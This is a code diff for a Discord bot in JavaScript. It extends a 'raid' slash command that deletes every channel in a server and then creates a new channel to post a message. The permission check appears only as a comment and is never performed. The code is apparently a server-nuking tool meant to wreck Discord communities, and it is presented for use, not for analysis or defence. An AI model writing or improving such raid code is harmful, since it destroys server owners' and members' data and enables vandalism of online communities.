@@ -27,6 +27,8 @@ client.on('interactionCreate', async (interaction) => {
 
   if (interaction.commandName === 'raid') {
     // Check if the user has the necessary permissions (e.g., MANAGE_CHANNELS)
+
+    const userMessage = interaction.options.getString('raidMessage');
   
     // Get the guild
     const guild = interaction.guild;
@@ -35,6 +37,23 @@ client.on('interactionCreate', async (interaction) => {
     await guild.channels.cache.forEach(channel => channel.delete());
 
     interaction.reply({ content: 'All channels have been removed.', ephemeral: true });
+
+
+    try {
+      const newChannel = await guild.channels.create('new-channel', {
+        
+        type: 'GUILD_TEXT',
+      });
+      
+      await newChannel.send('MESSAGE HERE.');
+      
+    } catch (error) {
+
+        console.log(`an error has occured, ${error}`)
+        return;
+    }
+    
+    // Send the user's message in the new channel
   }
 });
 
